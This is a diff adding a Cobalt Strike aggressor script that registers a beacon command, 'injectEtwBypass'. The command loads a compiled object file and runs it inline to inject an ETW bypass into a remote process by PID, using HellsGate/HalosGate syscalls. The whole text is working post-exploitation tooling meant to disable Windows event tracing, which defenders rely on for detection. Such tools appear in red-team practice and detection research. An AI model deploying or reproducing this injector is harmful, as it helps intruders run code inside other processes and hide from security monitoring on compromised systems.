@@ -1,0 +1,21 @@
+beacon_command_register(
+    "injectEtwBypass", 
+    "Inject ETW Bypass into Remote Process via Syscalls (HellsGate|HalosGate)", 
+    "Synopsis: injectEtwBypass PID"
+);
+
+alias injectEtwBypass {
+    if(size(@_) != 2)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("injectEtwBypass"));
+        return;
+    }
+    local('$handle $data $args');
+    $handle = openf(script_resource("injectEtwBypass.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $args = bof_pack($1, "i",$2);
+    btask($1, "Inject ETW Bypass (Bobby Cooke//SpiderLabs|@0xBoku|github.com/boku7)");
+    beacon_inline_execute($1, $data, "go", $args);
+}
